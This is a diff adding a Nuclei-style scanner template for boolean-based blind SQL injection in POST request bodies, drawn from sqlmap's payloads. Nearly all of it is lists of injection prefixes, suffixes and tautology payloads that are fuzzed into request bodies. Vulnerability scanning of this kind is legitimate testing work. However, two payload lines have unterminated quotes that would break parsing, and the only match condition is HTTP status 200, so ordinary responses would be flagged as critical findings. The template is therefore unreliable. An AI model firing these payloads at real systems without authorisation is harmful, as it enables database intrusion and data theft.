@@ -1,0 +1,138 @@
+id: boolean-sqli-post-request
+
+info:
+  name: Boolean based blind SQL injection for POST Request
+  author: Userware (U53RW4R3)
+  severity: critical
+  description: |
+    Detects potential boolean-based blind SQL injection for HTTP POST request.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  reference:
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/boundaries.xml
+    - https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/boolean_blind.xml
+  tags: sqli,dast
+
+http:
+  - filters:
+      - type: dsl
+        dsl:
+          - "method == 'POST'"
+          - "len(body) > 0"
+        condition: and
+
+    variables:
+        randomchar1: {{rand_char("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")}}
+        randomchar2: {{rand_char("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")}}
+        randomstr1: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+        randomstr2: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+        randomnum1: {{rand_int(1, 9999)}}
+        randomnum2: {{rand_int(1, 9999)}}
+
+    payloads:
+        prefix:
+            - ""
+            - " "
+            - "' "
+            - "\" "
+            - ") "
+            - ")) "
+            - "))) "
+            - "') "
+            - "')) "
+            - "'))) "
+            - "\") "
+            - "\")) "
+            - "\"))) "
+            - "%'"
+            - " WHERE {{randomnum1}}={{randomnum1}} "
+            - "' WHERE {{randomnum1}}={{randomnum1}} "
+            - "\" WHERE {{randomnum1}}={{randomnum1}} "
+            - "\") WHERE {{randomnum1}}={{randomnum1}} "
+            - "'||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "'||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+            - "'+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "||(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "||(SELECT '{{randomstr1}}' FROM DUAL WHERE {{randomnum1}}={{randomnum1}} "
+            - "+(SELECT {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "+(SELECT '{{randomstr1}}' WHERE {{randomnum1}}={{randomnum1}} "
+            - "')) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "\")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - ")) AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "') AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "\") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - ") AS {{randomstr1}} WHERE {{randomnum1}}={{randomnum1}} "
+            - "` WHERE {{randomnum1}}={{randomnum1}} "
+            - "`) WHERE {{randomnum1}}={{randomnum1}} "
+            - "]-(SELECT 0 WHERE {{randomnum1}}={{randomnum1}} "
+            - "{{randomstr1}}, "
+        suffix:
+            - ""
+            - " "
+            - "#"
+            - "# {{randomstr1}}"
+            - "--"
+            - "-- {{randomstr1}}"
+            - "-- \""
+            - "-- ;"
+            - "-- -"
+            - ")+"
+            - ")||'"
+            - ")+'"
+            - "OR '{{randomstr1}}'='{{randomstr2}}
+            - "AND ({{randomnum1}}={{randomnum1}}"
+            - "AND (({{randomnum1}}={{randomnum1}}"
+            - "AND ((({{randomnum1}}={{randomnum1}}"
+            - "AND ('{{randomstr1}}'='{{randomstr1}}"
+            - "AND (('{{randomstr1}}'='{{randomstr1}}"
+            - "AND ((('{{randomstr1}}'='{{randomstr1}}"
+            - "AND '{{randomstr1}}'='{{randomstr1}}"
+            - "AND ('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND (('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND ((('{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND '{{randomstr1}}%'='{{randomstr1}}"
+            - "AND '{{randomstr1}}' LIKE '{{randomstr1}}"
+            - "AND (\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND ((\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND (((\"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND \"{{randomstr1}}\"=\"{{randomstr1}}"
+            - "AND (\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND ((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND (((\"{{randomstr1}}\" LIKE \"{{randomstr1}}"
+            - "AND \"{{randomstr1}}\" LIKE \"{{randomstr1}}
+            - "{{randomstr2}}"
+        payload:
+            - "OR {{randomnum1}}={{randomnum1}}"
+            - "OR {{randomnum1}}={{randomnum1}} LIMIT 1"
+            - "OR {{randomnum1}}={{randomnum2}}"
+            - "OR {{randomnum1}}={{randomnum2}} LIMIT 1"
+            - "OR '{{randomchar1}}'='{{randomchar1}}'"
+            - "OR '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+            - "OR '{{randomchar1}}'='{{randomchar2}}'"
+            - "OR '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+            - "AND {{randomnum1}}={{randomnum1}}"
+            - "AND {{randomnum1}}={{randomnum1}} LIMIT 1"
+            - "AND {{randomnum1}}={{randomnum2}}"
+            - "AND {{randomnum1}}={{randomnum2}} LIMIT 1"
+            - "AND '{{randomchar1}}'='{{randomchar1}}'"
+            - "AND '{{randomchar1}}'='{{randomchar1}}' LIMIT 1"
+            - "AND '{{randomchar1}}'='{{randomchar2}}'"
+            - "AND '{{randomchar1}}'='{{randomchar2}}' LIMIT 1"
+
+    attack: clusterbomb
+
+    fuzzing:
+      - part: body
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{prefix}}{{payload}}{{suffix}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
